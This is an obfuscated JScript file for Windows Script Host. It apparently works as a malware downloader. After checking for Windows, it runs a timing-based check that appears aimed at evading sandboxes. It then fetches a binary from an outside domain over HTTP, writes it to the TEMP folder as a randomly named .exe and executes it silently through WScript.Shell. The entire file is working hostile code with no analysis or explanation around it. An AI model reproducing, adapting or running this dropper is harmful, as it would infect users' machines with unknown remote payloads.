var CC = false;
var HW = "Create"+"Object";
var JD = function LN() {return WScript[HW]("WScript"+".Shell");}(), K = 11;
var I = "MSXML2"+".XMLHTTP";
var NP = 2;
var S = NP - 2;
function XX(A){JD["Run"](A, S, S);};
function TT(){return I + "";};
function U(S0, MY){S = S * 1; return S0 - MY;};
function H(){return HW;};
/*@cc_on
  @if (@_win32 || @_win64)
    CC = true;
  @end
@*/
if (CC)
{
var W = "";
function L(){return 22;};
var M = 0; var T = 0;
function P()
{
var B = new this["Date"]();
var NX = B["getUTCMilliseconds"]();
WScript["Sleep"](L());
var B = new this["Date"]();
var XU = B["getUTCMilliseconds"]();
WScript["Sleep"](L());
var B = new this["Date"]();
var O0 = B["getUTCMilliseconds"]();
var M = "FZ";
M = U(XU, NX);
var T = "GR";
T = U(O0, XU);
W = "open";
return U(M, T);
}
var E = false;
var DO = false;
for (var OY = S; OY < L() * 1; OY++){if (P() != S){
E = true; 
T = "31" + 11 * M + T; 
DO = true; 
break;
}}
function X() {return ((E == true) && (E == DO)) ? 1 : S;};
if (E && X() && DO){
function PW() {return JD["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "tEg6v9sxTqKJVjlC.ex" + "e";};
 Y = TT();
 PP = WScript[HW](Y);
 var O = 1;
do { 
	for (;O;){
	try {
		if (O == 1)
		{
			PP[W]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			PP["send"]();
			RQ = "Sleep";
			O = 2;
		}
		WScript[RQ](L() + 120); 
		if (PP["readystate"] < 2 * 2) continue;
		O = S;
		function NS(FR) {var KP = (1, 2, 3, 4, 5, FR); return KP;};
		SM = WScript[H()]("ADODB.Stream");
		Y = SM;
		Y[W]();
		Y["type"] = NS(1);
		Y["write"](PP["ResponseBody"]);
		SM["position"] = NS(S);
		Y["Save" + "ToFile"](PW(), 2);
		SM["cl"+"ose"]();
		RN = PW();
		XX(RN);
	} catch(JU){};};
}while (O);
}
}

